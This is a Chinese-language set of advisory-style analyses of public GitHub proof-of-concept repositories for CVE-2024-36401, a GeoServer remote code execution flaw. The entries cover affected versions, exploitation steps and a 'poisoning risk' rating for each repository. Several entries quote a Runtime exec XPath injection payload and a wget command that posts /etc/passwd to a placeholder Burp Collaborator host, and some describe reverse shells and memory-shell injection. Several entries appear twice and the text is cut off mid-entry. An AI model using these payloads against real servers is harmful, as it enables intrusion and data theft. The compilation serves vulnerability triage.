**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

